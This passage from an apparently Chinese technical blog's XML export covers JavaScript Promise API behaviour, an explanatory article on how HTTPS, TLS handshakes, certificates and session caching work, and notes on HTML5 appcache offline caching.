用来创建一个已完成的 promise。与 Promise.reject 不同，如果传入值是thenable，会对值进行展开。最终的决议值可能是完成，也可能是拒绝。 12345678910111213const errP = new Promise(function(resolve, reject) &#123; throw 'Error Promise';&#125;)Promise.resolve(errP).then(function() &#123; console.log('完成Promise'); // 不会执行&#125;, function(err) &#123; console.log(err) // Error Promsise&#125;)Promise.resolve(3).then(function(data) &#123; console.log(data); // 3&#125;) 注：如果传入的值是真正的 promise，Promise.resolve 会直接将这个值返回，不会做其他操作。 then(…) 和 catch(…)每个 Promise 实例都会有 then 和 catch 方法，通过这两个方法可以为 promise 注册完成或拒绝函数。promise 决议之后会调用其中一个函数，完成 或 拒绝。但是不会两个方法都调用，只能调用其中一个，且只调用一次。自然也都是异步的。 then 接受两个函数作为参数，第一个用于完成，第二个用于拒绝。也都有默认值，如果有哪个参数没有传或者传入非函数值都会被默认函数取代。默认完成函数只是简单的将值返回，默认拒绝函数会简单的将出错原因抛出。 123456// then 的两个参数有默认值Promise.resolve(1).then(function (value) &#123; return value; // 默认将 value 直接返回&#125;，function (err) &#123; throw err; // 默认直接将 err 抛出&#125;) catch 只接受一个拒绝函数作为参数，并自动默认替换回调。 1234567891011const p = new Promise(function(resolve, reject) &#123; resolve(2);&#125;)p.then(null, function(err) &#123; console.log(err);&#125;)// catch 和 then(null, function) 等价p.catch(function(err) &#123; console.log(err);&#125;) then(…) 和 catch(…) 都会创建并返回的一个新的 promise，这个 promise 可用于实现 promise 的链式流控制。如果完成或拒绝回调中抛出异常，那么返回的 promise 是拒绝的。如果任意一个回调返回 非 promise、非 thenable 的立即值，那么这个值会当作返回 promise 的完成值。如果处理函数返回一个 promise 或 thenable，那么这个值将会被展开，并作为返回 promise 的决议值。 Promise.all([…]) 和 Promise.race([…])Promise.all([…]) he Promise.race([…]) 都会创建一个 promise 作为返回值，其决议值由传入的 promise 数组决定。 Promise.all([…])，只有传入的所有 promise 都完成，返回的 promise 才能完成。如果有任何一个的 promise 被拒绝，那么返回的 promise 就立刻被拒绝，并且抛弃其他 promise 的值。如果完成，会得到一个数组，其中包含所有 promise 的完成值。如果拒绝，只会得到第一个被拒绝的 promise 的决绝值。 Promise.race([…])，只要第一个 promise （完成或拒绝），那么返回的 promise 立即（完成或拒绝），并将第一个完成的 promise 的决议值，作为返回 promise 的决议值。 123456789const p1 = Promise.resolve(1);const p2 = Promise.resolve(2);const p3 = Promise.reject('error');Promise.race([p3, p2, p1]).then(function() &#123; console.log(data);&#125;).catch(function(err) &#123; console.log(err)； // error&#125;) 注：若 Promise.all([…]) 传入空数组，它会立即完成。但 Promise.race([…]) 会挂，永远不会决议。 ES6 Promise API 非常直观。至少足以处理最基本的一些异步情况，但也有它的局限性，下面我们来讨论一下。 Promise 局限 首先是处理错误的顺序，前文我们已经讨论过了，可以翻回去看看。 其次我觉的 then(…) then(…) then(…) 的很烦。虽然它部分解决了回调地狱的问题～ 还有其他比较细微的问题，我没有相应的实践不太好说，推荐各位看 《你不知道的 javascript 中卷》 至于上面的小问题怎么解决呢？请看下篇 js异步进化史之 Generator]]></content>
      <categories>
        <category>异步</category>
      </categories>
      <tags>
        <tag>Promise</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[揭开 HTTPS 的神秘面纱]]></title>
    <url>%2Fhttps%2F</url>
    <content type="text"><![CDATA[本文摘自 segmentfault全站 HTTPS 来了 HTTPS 基础概念大家都了解过 HTTPS （安全超文本协议）是 HTTP 的安全版，为什么说 HTTPS 安全而 HTTP 不安全呢？ HTTP 存在安全隐患是因为数据都是通过明文传输，如果被中间人攻击会有三方面的风险： 信息窃听 信息篡改 身份冒充 HTTPS 对传输的信息进行了加密，完整性校验，身份识别进而避免了中间人攻击： 信息加密 完整性校验 身份验证 废话少说，上图上图（图片来源） TLS/SSL 原理HTTPS 是如何实现上述功能避免中间人攻击的呢？诀窍就在 TLS/SSL TLS/SSL 全称安全传输层协议 Transport Layer Security, 是介于 TCP 和 HTTP 之间的一层安全协议。（不影响原有的 TCP 协议 和 HTTP 协议，所以使用 HTTPS 不需要对 HTTP 进行太多的改造）因此可以说 HTTPS = HTTP + TLS/SSL。 TLS/SSL 的功能实现主要依赖于三类算法： 非对称加密：用于身份认证和密钥协商 对称加密：采用协商的密钥对数据加密 散列函数 Hash：用于验证信息的完整性 上图上图（图片来源） 非对称加密：常见的 RSA，还包括 ECC、DH 等算法，算法的特点是，密钥成对出现，一般称为公钥（公开）和私钥（保密），公钥加密的信息只有私钥能解开，私钥加密的信息只能公钥解开。因此掌握公钥的不同客户端之间不能互相解密信息，只能和掌握私钥的服务器进行加密通信，服务器可以实现一对多的通信，客户端也可以用来验证掌握私钥的服务器身份。 对称加密：常见的有 AES-CBC、DES、3DES、AES_GCM 等，相同的密钥可以用于信息的加密和解密，掌握密钥才能获取信息，能够防止信息窃听，通信方式是 1 v 1。 散列函数 Hash: 常见的有 MD5、SHA、SHA256，该类函数的特点是函数单向不可逆、对输入非常敏感，输出长度固定，针对数据的任何修改都会改变散列的结果，用于防止信息篡改并验证数据的完整性。 这三类算法是相互作用的，在信息传输过程中，散列函数不能单独实现信息防篡改，因为明文传输，中间人可以修改信息后重新计算信息摘要，因此需要对传输的信息以及信息摘要进行加密；对称加密的优势是信息传输 1对1，需要共享相同的密码，密码的安全是保证信息安全的基础，服务器和 N 个客户端通信，需要维持 N 个密码记录，且缺少密码修改机制；非对称加密的特点是信息传输 1对多，服务器只需要维持一个私钥就能够和多个客户端进行通信，单服务器发出的信息能够被所有的客户端解密，且该算法的计算复杂，加密速度慢。 综合三类算法的特点，TLS 的基本工作方式是，客户端使用非对称加密与服务器进行通信，进行身份验证并协商对称密钥使用的密钥，然后对称加密算法采用协商密钥对信息以及信息摘要进行加密通信，不同的节点之间采用的对称密钥不同， 从而可以保证信息只能通信双方获取。 PKI体系RSA 身份验证的隐患身份验证和密钥协商是 TLS 的基础功能，要求的前提是合法的服务器掌握着对应的私钥。但是 RSA 算法无法确保服务器身份的合法性，因为公钥并不包含服务器信息，存在安全隐患： 客户端 C 和服务器 S 进行通信，中间节点 M 截获了二者的通信； 节点 M 自己计算产生一对公钥 pub_M 和私钥 pri_M； C 向 S 请求公钥时，M 把自己的公钥 pub_M 发给了 C； C 使用公钥 pub_M 加密的数据能够被 M 解密，因为 M 掌握对应的私钥 pri_M，而 C 无法根据公钥信息判断服务器的身份，从而 C 和 M 建立了“可信”的加密连接； 中间节点 M 和服务器 S 之间在建立合法连接，因此 C 和 S 之间通信被 M 完全掌握，M 可以信息的窃取篡改等操作。 另外，服务器也可以对自己发出的信息进行否认，不承认相关信息是自己发出。 因此该 方案下至少存在两类问题：中间人攻击和信息抵赖。 身份验证-CA 和证书解决上述身份验证问题的关键是确保获取的公钥途径是合法的，能够验证服务器的身份信息，为此需要引入权威的第三方机构 CA。CA 负责核实公钥拥有者的信息，并颁发认证“证书”，同时能够为使用者提供证书验证服务，即 PKI 体系。 基本原理为，CA 负责审核信息，然后对关键信息利用私钥进行“签名”，公开对应的公钥，客户端可以利用公钥验证签名。CA 也可以吊销已经签发的证书，基本的方式包括两类 CRL 文件和 OCSP。CA 使用具体流程如下： 服务方 S 向第三方机构 CA 提交公钥、组织信息和个人信息（域名）等信息并申请认证； CA 通过线上、线下等多种手段验证申请者提供信息的真实性，如组织是否存在、企业是否合法，是否拥有域名的所有权等； 如信息审核通过，CA 会向申请者签发认证文件——证书。 证书包含以下信息：申请者公钥、申请者的组织信息和个人信息、签发机构 CA 的信息、有效时间、证书序列号等信息的明文，同时包含一个签名； 签名的产生算法：首先，使用散列函数计算公开的明文信息的信息摘要，然后，采用 CA 的私钥对信息摘要进行加密，迷文即签名。 客户端 C 向服务器 S 发出请求时，S 返回证书文件； 客户端 C 读取证书中的相关明文信息，采用相同的散列函数计算得到信息摘要，然后利用对应 CA 的公钥解密签名数据，对比证书的信息摘要，如果一致，则可以确认证书的合法性，即公钥合法； 客户端然后验证证书相关的域名信息、有效时间等信息； 客户端会内置信任 CA 的证书信息（包含公钥），如果 CA 不被信任，则找不到对应 CA 的证书，证书也会被判定非法。 在这个过程注意几点： 申请的证书不需要提供私钥，确保私钥永远只能服务器掌握； 证书的合法性仍然依赖于非对称加密算法，证书主要是增加了服务器信息以及签名； 内置 CA 的证书成为根证书，颁发者和使用者相同，自己为自己签名，即自签名证书； 证书 = 公钥 + 申请者与颁发者信息 + 签名； 证书链如 CA 根证书和服务器证书中间增加一层证书机构，即中间证书，证书的产生和验证原理不变，只是增加一层验证，只要最后能够被任何信任的 CA 根证书验证合法即可。 服务器证书 server.pem 的签发者为中间证书机构 inter，inter 根证书 inter.pem 验证 server.pem 确实为自己签发的有效证书； 中间证书 inter.pem 的签发 CA 为 root，root 根据证书 root.pem 验证 inter.pem 为自己签发的合法证书； 客户端内置信任 CA 的 root.pem 证书，因此服务器证书 server.pem 被信任。 服务器证书、中间证书与根证书在一起组合成一条合法的证书链，证书链的验证时自下而上的信任传递的过程。 二级证书结构存在优势： 减少根证书结构的管理工作量，可以更高效的进行证书的审核与签发； 根证书一般内置在客户端中，私钥一般离线存储，一旦私钥泄漏，则吊销过程非常困难，无法及时补救； 中间证书结构的私钥泄漏，则可以快速在线吊销，并重新为用户签发新的证书； 证书链四级以内一般不会对 HTTPS 的性能造成明显的影响； 证书链有以下特点： 同一本服务器证书可能存在多条合法的证书链。因为证书的生成和验证基础是公钥和私钥对，如果采用相同的公钥和私钥生成不同的中间证书，针对被签发者而言，该签发机构都是合法的 CA，不同的是中间证书的签发机构不同； 不同证书链的层级不一定相同，可能二级、三级、四级证书链。 中间证书的签发机构可能是根证书也可能是另一个中间证书机构，所以证书链层级不一定相同。 证书吊销CA 机构能够签发证书，同样也存在机制宣布以往签发的证书无效。证书的使用者不合法，CA 需要废弃该证书；或者私钥丢失，使用者申请让证书无效。主要存在两类机制：CRL 和 OCSP。 (a) CRL Certificate Revocation List, 证书吊销列表，一个单独的文件。该文件包含了 CA 已经吊销的证书序列号（唯一）与吊销日期，同时该文件包好生效日期并通知下次更新该文件的时间，当然该文件必然包含 CA 私钥的签名以验证文件的合法性。 证书中一般会包含一个 URL 地址 CRL Distribution Point，通知使用者去哪里下载对应的 CRL 以校验证书是否吊销。该吊销方式的优点是不需要频繁更新，但是不能及时吊销证书，因为 CRL 更新时间一般是几天，这期间可能已经造成了极大的损失。 (b) OCSP Online Certificate Status Protocol，证书在线状态查询协议，一个实时查询证书是否吊销的方式。请求者发送证书的信息并请求查询，服务器返回正常、吊销或未知中的任何一个状态。证书中一般也会包含一个 OCSP 的URL地址，要求查询服务器拥有良好的性能。部分 CA 或大部分的自签 CA （根证书）都是未提供 CRL 或 OCSP 地址的，对于吊销证书会是一件非常麻烦的事情。 TLS/SSL 握手过程握手与密钥协商过程基于 RSA 握手和密钥交换的客户端验证服务器🌰 client_hello 客户端发起请求，以明文传输请求信息，包含保本信息，加密套件候选列表，压缩算法候选列表，随机数，扩展字段等信息，相关信息如下： 支持的最高版本 TSL 协议版本 version，从低到高依次 SSLv2、SSLv3、TLSv1、TLSv1.1、TLSv1.2，当前基本不再使用低于 TLSv1 的版本； 客户端支持的加密套件 cipher suites 列表，每个加密套件对应前面 TLS 原理中的四个功能的组合： 认证算法 AU（身份认证）、密钥交换算法 KeyExchange（密钥协商）、对称加密算法 Enc (信息加密)和信息摘要 Mac（完整性校验）； 支持的压缩算法 compression methods 列表，用于后续的信息压缩传输； 随机数 random_C，用于后续密钥的生成； 扩展字段 extensions，支持协议与算法的相关参数以及它们的辅助信息等，常见的 SNI 就属于扩展字段，后续单独讨论该字段的作用。 Server_hello + server_certificate + server_hello_done Server_hello，服务端返回协商的信息结果，包括使用的协议版本 version，选择的加密套件 cipher suite，选择的压缩算法 compression method，随机数 random_S 等，其中随机数用于后续的密钥协商； Server_certifications，服务器端配置对应的证书链，用于身份验证和密钥交换； Server_hello_done，通知客户端 server_hello 信息发送结束； 证书校验 客户端验证证书的合法性，如果验证通过才会进行后续通信，否则根据错误情况不同作出提示和操作，合法性验证包括如下： 证书链的可信性 trusted certificate path，方法如前文所述； 证书是否吊销，有两类方式离线 CRL 和在线 OCSP，不同的客户端行为不同； 有效期 expiry date，证书是否在有效时间范围； 域名 domain，核查证书域名是否与当前访问域名匹配，匹配规则后续分析； Client_key_exchange + change_cipher_spec + encrypted_hanshake_message Client_key_extange，合法性验证通过后，客户端产生随机数 Pre-master，并用证书公钥加密，发送给服务器； 此时客户端已经获取全部计算协商密钥需要的信息：两个随机数 random_C 和 random_S 与自己计算产生的 Pre-master, 计算得到的协商密钥； 1enc_key=Fuc(random_C, random_S, Pre-Master) Change_cipher_spec，客户端通知服务器后续的通信都采用协商的密钥和加密算法进行加密通信； Encrypted_hanshake_message，结合之前所有通行参数的 hash 值与其他相关信息生成一段数据，采用协商密钥 session secret 与算法进行加密，然后发送给服务器用于数据与握手验证； Change_cipher_spec + encrypted_hanshake_message 服务器用私钥解密加密的 Pre-master 数据，基于之前的两个明文随机数 random_C 和 random_S，计算得到协商密钥 1enc_key = Fuc(random_C, random_S, Pre_Master); 计算之前所有接受信息的 hash 值，然后解析客户端发送的 encrypted_hanshake_messge，验证数据和密钥正确性； change_cipher_spec，验证通过后，服务器同样发送 change_cipher_spec 以告知客户端后续的通信都采用协商的密钥与算法进行加密通信； Encrypted_hanshake_message，服务器也结合所有当前的通信参数信息生成一段数据并采用协商密钥 session secret 与算法加密并发送到客户端； 握手结束 客户端计算所有接受信息的 hash 值，并采用协商密钥解密 encrypted_hanshake_message，验证服务器发送的数据和密钥，验证通过则握手碗好完成； 加密通信 开始使用协商密钥与算法进行加密通信 注意： 服务器也可以要求验证客户端，即双向认证，可以在过程 2 要发送 client_certificate_request 信息，客户端在过程 4 中先发送 client_certificate 与 certificate_verify_message 信息，证书的验证方式基本相同，certificate_verify_message 是采用 client 的私钥加密的一段基于已经协商的通信信息得到的数据，服务器可以采用对应的公钥解密并验证； 根据使用的密钥交换算法的不同，如 ECC 等，协商细节略有不同，大体类似； server key exchange 的作用是 server certificate 没有携带足够的信息时，发送给客户端以计算 pre-master，如基于 DH 的证书，公钥不被证书包含，需要单独发送； change cipher spec 实际可用于通知对端改版当前使用的加密通信方式，当前没有深入分析； alter message 用于指明在握手或通信过程中的状态改变或错误信息，一般警告信息出发条件是连接关闭，收不到合法信息，信息解密失败，用户取消操作等，收到警告信息后，通信会被断开或者由接受方决定是否断开。 会话缓存握手过程为了加快建立握手的速度，减少协议带来的性能降低和资源消耗（具体分析在后文），TLS 协议有两类会话缓存机制：会话标识 session ID 与会话记录 session ticket。 Session ID 由服务器端支持，协议中的标准字段，因此基本所有的服务器都支持，服务器端保存会话 ID 以及协商的通信信息，Nginx 中 1M 内存约可以保存 4000 个 session ID 机器相关信息，占用服务器资源较多； sessoin ticket 需要服务器和客户端都支持，属于一个扩展字段，支持范围约60%（无可靠统计来源），将协商的通信信息加密之后发送给客户端保存，密钥只有服务器知道，占有服务器资源很少。 二者对比，主要是保存协商信息的位置与方式不同，类似于 http 中的 session 与 cookie。 二者都存在的情况下，（nginx 实现) 优先使用 session_ticket。 握手过程如下图： 注意：虽然握手过程由 1.5 个来回，但是最后客户端向服务器发送的第一条应用数据不需要等待服务器返回的信息，因此握手的延时是 1 * RTT。 会话标识 session ID 如果客户端和服务器之间曾经建立过连接，服务器会在握手成功后返回 session ID，并保存对应的通信参数在服务器中； 如果客户端需要和服务器再次建立连接，则在 client_hello 的 session ID 中携带记录信息，发送给服务器； 服务器根据收到的 session ID 检索缓存记录，如果没有检索到或缓存过期，则按照正常的握手进行； 如果检索到对应的缓存记录，则返回 change_cipher_spec 与 encrypted_handshake_message 信息，两个信息的作用类似，encrypted_handshake_message 是当前的通信参数与 master_secret 的hash 值； 如果客户端能够验证通过服务器加密的数据，则客户端同样发送 change_cipher_spec 与 encryped_handshake_message 信息； 服务器验证数据通过，则握手建立成功，开始进行正常的数据通信。 会话记录 session ticket 如果客户端和服务器之前曾经建立过连接，服务器会在 new_session_ticket 数据中携带加密的 session_ticket 信息，客户端保存； 如果客户端再次和该服务器建立连接，则在 client_hello 的扩展字段 sesion_ticket 中携带加密信息，一起发送给服务器端； 服务器解密 session_ticket 数据，如果解密失败，则按照正常的握手过程进行； 如果解密成功，则返回 change_cipher_spec 和 encryted_handshake_message 信息，两个信息的作用和 session ID 类似； 如果客户端能够验证服务器加密数据，则客户端同样发送 change_cipher_spec 和 encryed_handshake_message 信息； 服务器验证数据通过，则握手建立成功，开始进行正常的加密数据通信。 重新连接重新建立连接，即放弃正在使用的 TSL 连接，重新进行身份验证和密钥协商过程，特点是不需要断开当前的数据传输就可以重新身份认证、更新密钥或算法，因此服务器端存储和缓存的信息都可以保持。客户端和服务器端都可以发起重新连接过程，当前的 windows 2000 &amp; xp 与 SSL 2.0 不支持。 服务器重新连接 服务器重建连接一般情况是客户端访问受保护的数据时发生。基本过程如下： (a) 客户端和服务器建立了有效的 TLS 连接并通信； (b) 客户端访问受保护的信息； (c) 服务端返回 hello_request 信息； (d) 客户端收到 hello_request 信息后，发送 client_hello 信息，开始重新建立连接。 客户端重新连接 客户端重新连接一般是为了更新密钥。 客户端与服务器建立了有效的 TLS 连接并通信； 客户端需要更新密钥主动发起了 client_hello 信息； 服务器收到 client_hello 信息后，无法立即识别出该数据为非应用数据，因此会提交给下一步处理，处理完后会返回通知该信息为要求重新连接过程； 在确定重新连接前，服务器不会立即停止向客户端发送数据，可能恰好同时或有缓存数据需要发送给客户端，但是客户端不会再发送任何信息给服务器； 服务器识别出重新连接请求之后，发送 server_hello 信息至客户端； 客户端也同样无法立即判断出信息非应用数据，同样提交给下一步处理，处理之后会返回通知该信息为要求重建连接； 客户端和服务器开始新的重建连接过程； 密钥计算上节提到了两个明文传送的随机数 random_C 和 random_S 与通过加密在服务器和客户端交换的 pre-master，三个参数作为密钥协商的基础。本节讨论说明密钥协商的基本计算过程以及通信过程中密钥的使用。 计算 Key 涉及参数 random client、random server、pre-master、master secret、key material，计算密钥时，服务器和客户端都具有这些信息，交换方式上节有说明，计算流程如下： 客户端采用 RSA 或 Diffie-Hellman 等加密算法生成 Pre-master; Pre-master 结合 random client 和 random server 两个随机数，通过 pseudoRandomFunction(PRF) 计算得到 master secret; master secret 结合 random client 和 random server 两个随机数，通过迭代计算得到 key master; 以下为一些重要的记录，可以解决部分爱深入研究朋友的疑惑，copy 的材料，分享给大家： (a) PreMaster secret 前两个字节时 TLS 的版本号，这是一个比较重要的用来核对握手数据的版本号，因为在 client_hello 阶段，客户端会发送一份加密套件列表和当前支持的SSL/TLS 的版本号给服务器，而且是使用明文传送的，如果握手的数据包在破解之后，攻击者很有可能篡改数据包，选择一个安全性较低的加密套件和版本给服务器，从而对数据进行破解。所以，服务端需要对蜜文中解密出来的 PreMaster 版本号跟之前 Client Hello 阶段的版本号进行对比，如果版本号变低，则说明被篡改，则立即停止发送任何消息。 (b) 不管是客户端还是服务器，都需要随机数，这样生成的密钥才不会每次都一样。由于 SSL 协议中证书是静态的，因此十分有必要引入一种随机因素来保证协商出来的密钥的随机性。 对于 RSA 密钥交换算法来说，pre-master-key 本身就是一个随机数，在加上 hello 信息中的随机，三个随机数通过一个密钥导出器最终导出一个对成密钥。 pre-master 的存在在于 SSL 协议不信任每个主机都能产生完全随机的随机数，如果随机数不随机，那么 pre master secret 就可能被猜出来，那么仅使用 pre master secret 作为密钥就不合适了，因此必须引入新的随机因素，那么客户端和服务器 pre master secret 三个随机数一同生成密钥就不容易被猜出来了，一个伪随机可能完全不随机，可是三个伪随机就十分接近随机了，每增加一个自由度，随机性增加的可不是一。 密钥使用 key 经过 12 轮迭代计算会产生 12 个 hash 值，分组成 6 个元素，列表如下： Mac key、encryption key 和 IV 是一组加密元素，分别被客户端和服务器使用，但是这两组元素都被两边同时获取； 客户端使用 client 组元素加密数据，服务器使用 client 元素解密；服务器使用 server 元素加密，client 使用 server 元素解密； 双向通信的不同方向，使用的密钥不同，破解通信至少要破解两次； encrytion key 用于对称加密数据 IV 作为很多加密算法的初始化向量使用，具体可以研究堆成加密算法； Mac key 用于数据的完整性校验； 数据加密通信过程 对应用层数据进行分片成合适的 block; 为分片数据编号，防止重放攻击； 使用协商的压缩算法压缩数据； 计算 MAC 值和压缩数据组成传输数据； 使用 client encryption key 加密数据，发送给服务器； server 收到数据后，使用 client encryption key 解密，校验数据，解压数据，重新组装； 注意：MAC 值的计算包括连个 hash 值：client Mac key 和 Hash (编号、包类型、长度、压缩数据) 抓包分析关于抓包不再详细分析，按照前面的分析，基本情况都能够匹配，根据平常定位问题的过程，个人认为需要注意的地方： 抓包 HTTP 通信，能够清晰看到通信的头部和信息的明文，但是 HTTPS 是加密通信，无法看到 HTTP 协议的相关头部和数据的明文信息； 抓包 HTTPS 通信主要分为三个过程：TCP 建立连接、TLS 握手、TLS 加密通信。主要分析 HTTPS 通信的握手建立和状态等信息； Client_hello 根据 version 能够知道客户端支持的最高的协议版本号，如果是 SSL 3.0 或 TLS 1.0 等地版本协议，非常注意可能因为版本低引起一些握手失败的情况； 根据扩展字段中的 server_name 字段判断是否支持 SNI，存在则支持，否则不支持，对于定位握手失败或证书返回错误非常有用； 会话标识 session ID 是标准协议部分，如果没有建立过连接，则该字段为空，不为空则说明之前建立过连接并缓存； 会话记录 session ticket 是扩展协议部分，存在该字段则说明协议支持 session ticket, 否则不支持，存在且为空，说明之前未建立并缓存连接，存在且值不为空，说明有缓存连接； Server_hello 根据 TLS version 字段能够推断出服务器支持的协议的最高版本，版本不同可能造成握手失败； 基于 cipher_suite 信息判断出服务器优先支持的加密协议； certificate 服务器配置并返回的证书链，根据证书信息，并与服务器配置文件对比，判断请求与期望是否一致，如果不一致，是否返回的默认证书； alert 警告信息 alert 会说明建立连接失败的原因即警告类型，对于定位问题非常重要； HTTPS 性能优化HTTPS 性能消耗前文讨论了 HTTPS 的原理及优势：身份验证、信息加密、完整性校验等，且未对 HTTP 和 TCP 做任何修改。但通过增加新协议以实现更安全的通信必然要付出代价，HTTPS 的性能损耗主要体现如下： 增加延时 分析前面的握手过程，一次完整的握手过程至少需要两端依次来回两次通信，至少增加延时 2 RTT，利用回话缓存从而复用连接，也至少要增加 1 RTT延时。 消耗较多的 CPU 资源 出了数据传输外，HTTPS 主要包括对对称加解密、非对称加解密（服务器主要采用私钥解密数据）；压测 TS8 机型的单核 CPU；对称加密算法 AES-CBC-256 吞吐量 600Mbps，非对称 RSA 私钥解密 200 次/s 。不考虑其他软件层面的开销，10G 网卡为对称加密需要消耗 CPU 约 17 核，24 核 CPU 最多接入 HTTPS 4800； 静态节点当前 10G 网卡的 TS8 机型的 HTTP 单机接入能力约为 10w/s，如果将所有的 HTTP 连接变为 HTTPS 连接，则明显 RSA 的解密最先成为瓶颈。因此，RSA 的解密能力是当前困扰 HTTPS 接入的主要难题。 HTTPS 接入优化 CDN 接入 HTTPS 增加的延时主要是 RTT，RTT 的特点是节点越近延时越小，CDN 天然离用户最近， 因此选用 CDN 作为 HTTPS 的接入口，将能极大减少接入延时。CDN 节点通过和业务服务器维持长连接、会话复用和链路质量优化等可控方法，极大的减少 HTTPS 带来的延时。 会话缓存 虽然前文提到 HTTPS 即使采用会话缓存也至少要 1 * RTT 的延时，但是至少延时已经减少为原来的一半，明显的延时优化；同时，基于会话缓存建立的 HTTPS 连接不需要服务器使用 RSA 私钥解密获取 Pre-master 信息，可以省去 CPU 消耗。如果业务连接访问集中，缓存命中率高，则 HTTPS 接入能力会明显提升。 硬件加速 为介入服务器安装专用的 SSL 硬件加速卡，作用类似 GPU，释放 CPU，能够具有更高的 HTTPS 介入能力且不影响业务程序。测试某硬件加速卡单卡可以提供 35k 的解密能力，相当于 175核 CPU，至少相当于 7 台 24 核的服务器，考虑到接入服务器其他程序的开销，一张硬件卡可以实现接近 10 台服务器的介入能力。 远程解密 本地接入消耗过多的 CPU 资源，浪费了网卡和硬盘资源，考虑将最消耗 CPU 资源的 RSA 解密计算任务转移到其他服务器，如此则可以充分发挥服务器的介入能力，充分利用宽带与网卡资源。远程解密服务器可以选择 CPU 负载较低的机器充当，实现机器资源的复用，也可以是专门优化的高计算性能服务器。当前也是 CDN 用于大规模 HTTPS 接入的解决方案之一。 SPDY/HTTP2 前面的方法分别从减少延时和单机负载的方法提高 HTTPS 的介入能力，但是方法都是基于不变的 HTTP 协议的基础上提出的优化方法，SPDY/HTTP2 利用 TLS/SSL 带来的优势，通过修改协议的方法来提升 HTTPS 的性能，提高下载速度等。]]></content>
      <categories>
        <category>https</category>
      </categories>
      <tags>
        <tag>https</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[appcache]]></title>
    <url>%2Fappcache%2F</url>
    <content type="text"><![CDATA[H5 离线缓存技术，介绍文档这里不在赘述，需要请自行查阅 MDN 文档。更新流程如下，如有错误，欢迎抛砖！ 目标主要用来缓存 html(css已经注入其中), 和公用 js 文件。图片缓存看线上表现再决定是否加入缓存 or 使用占位图片？判断依据为：不缓存图片是否会出现页面抖动等问题。 appcache apiapplicationCache.update @无参数 “首次”进入页面会自动触发一次 用于手动调起 manifest 文件更新，触发 checking 事件 在发起 manifest 请求发生错误将触发 obsolete 或 error 事件，具体看下文规则。如果页面没有监听相应的函数，错误直接抛出到全局 applicationCache.swapCache @无参数 UPDATEREADY 后可以调用这个方法，将下载到临时缓存的内容切换到缓存中，当前打开页面引用的资源不变，在打开新子页面就会应用新的资源 application.abort() 取消正在下载的缓存(已经被移除，详情传送门 appcache event cached：下载完毕，并已缓存（首次下载完毕并混存完毕，首次不会触发 updateready 事件） checking：检查 manifest 有无更新 noupdate： manifest 没有更新 downloading：正在下载需要缓存的资源 progress：下载资源的进度 updateready：下载完毕准备更新缓存 obsolete：在已发现 manifest 的前提下，再次下载出现 404, 410 触发这个错误 error： manifest 刚开始下载（此前没有成功下载的记录）出现 404，410 manifest 没有改变，但是引用 manifest 的 html 没有被正确的下载 在下载 manifest 列举的文件的时候发生致命错误例如 500 在更新 manifest 文件过程中，manifest 文件发生改变 manifest manifest 文件必须声明为 no-cache，实现更新 有文件更改的时候，必须更改 manifest 文件，（若对应的缓存文件 url 不变，可以通过修改 manifest 版本号实现），因为浏览器检测到了 manifest 更新，才会去更新缓存。 manifest 的 MIME 类型必须是 text/cache-manifest，防止有些平台无法识别这种文件 主记录（声明 manifest 的 html 文件）不要写入缓存列表，默认自动缓存 不用使用 get 参数访问缓存文件，会使浏览器直接从网络拉取资源（也不要用 html 加版本号实现缓存的实时更新，这样做会导致浏览器缓存所有 html 的版本，容易超过 appcache 的存储空间，默认是 5m，具体各个平台实现有差异） 可以通过设置 manifest 404 清除所有的缓存 站点中的其他页面即使没有设置manifest属性，请求的资源如果在缓存中也从缓存中访问 FALLBACK 中的资源必须和manifest文件同源 引用 manifest 的 html 必须与 manifest 文件同源，在同一个域下 问题跨域 manifest 文件中列出的资源url必须和 manifest 本身使用同样的网络协议，如果manifest文件使用的是http协议，则列表中https协议的文件就会被忽略。(如果是 https 会忽略 http) 在SSL安全连接下，所有在 manifest 配置的资源列表需符合同源策略。即所有的地址都必须是相对地址。但Chrome除外，在SSL下，即使有非同源的资源，Chrome 和大部分 android 仍旧会下载至离线缓存中 对于不同协议的文件，不同平台有不同的实现方式，有的直接走网络，有的走浏览器缓存。在 http 域中引用 https 资源有些平台还会直接拦截，如 iphoneX 超出缓存大小行为 超出文件大小限制触发 error 事件，错误类型为 quota 首次下载缓存时超出大小，所有资源都不会缓存，而是请求网络，应用功能正常。更新资源后超出大小，缓存不会更新，应用无法更新。 对于兼容 appcache 的平台，缓存通常足够大，如果不滥用的话。 其他 一个资源的加载失败会导致全部更新失败？ 答：硬伤，暂时没想到好方案 二次更新问题，用户第二次访问才能获取资源的更新？ 答：硬伤，暂时没想到好的方案 manifest 更新时，已混存的文件会重新下载吗？ 答：浏览器会根据 manifest 描述的缓存列表全部重新拉取，存入临时缓存，用户再次进入再推入缓存 更新 manifest 缓存时，如何处理已经混存的文件？ 答：浏览器会剔除【不必要】的缓存文件，例如过期的 js 文件等，但只是 get 参数不同会一直缓存着，不会被清除 没有被 manifest 声明的文件不会加载? 答：NETWORK section 加上通配符 * 添加 manifest download 相关的更新事件监听脚本，需要两次更新 manifest 才能生效(首次缓存第一次就会生效) 答：第一次更新脚本，第二次更新 manifest 文件后才会触发脚本监听的事件 首次进入含有 appcache 的 html 主页面，progress 显示的缓存文件数会比实际情况少 1？答：首次进入页面，主 html 的缓存不会计入 progress 监控关注点 白屏时间的改善情况？ 产品更新上线后，所有访问用户新版本使用情况？第一次访问用户？第 &gt;= 2 次访问的用户？ 缓存失败率（sw, appcache) 会不会有永远不更新的用户？ 统计 sw 和 appcache 占比？]]></content>
      <categories>
        <category>离线缓存</category>
      </categories>
      <tags>
        <tag>appcache</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[box-sizing]]></title>
    <url>%2Fbox-sizing%2F</url>
